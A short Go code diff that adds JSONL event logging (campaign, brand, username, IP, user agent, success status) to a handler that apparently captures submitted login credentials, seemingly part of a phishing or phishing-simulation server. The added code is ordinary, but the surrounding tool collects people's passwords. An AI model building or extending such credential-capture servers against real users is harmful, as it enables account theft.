@@ -87,6 +87,27 @@ func handleCapture(redirectURL string) http.HandlerFunc {
 			"ip":         r.RemoteAddr,
 			"user_agent": r.UserAgent(),
 		}
+		// Write analytics event to shared JSONL
+		campaignID := r.FormValue("campaign")
+		status := "success"
+		if username == "" && password == "" {
+			status = "failed"
+		}
+		brand := r.FormValue("brand")
+		if brand == "" {
+			brand = "unknown"
+		}
+		writeEvent(map[string]interface{}{
+			"timestamp":   time.Now().UTC().Format(time.RFC3339),
+			"campaign_id": campaignID,
+			"brand":       brand,
+			"username":    username,
+			"ip":          r.RemoteAddr,
+			"user_agent":  r.UserAgent(),
+			"status":      status,
+			"source":      "capture",
+		})
+
 		raw, _ := json.Marshal(data)
 
 		encrypted, err := encryptAESGCM(raw, storageKey)
@@ -117,4 +138,21 @@ func encryptAESGCM(plaintext, key []byte) ([]byte, error) {
 		return nil, err
 	}
 	return gcm.Seal(nonce, nonce, plaintext, nil), nil
+}
+
+func writeEvent(ev map[string]interface{}) {
+	raw, err := json.Marshal(ev)
+	if err != nil {
+		log.Printf("[jsonl] marshal error: %v", err)
+		return
+	}
+	f, err := os.OpenFile("../data/captures.jsonl", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		log.Printf("[jsonl] open error: %v", err)
+		return
+	}
+	defer f.Close()
+	if _, err := f.Write(append(raw, '\n')); err != nil {
+		log.Printf("[jsonl] write error: %v", err)
+	}
 }
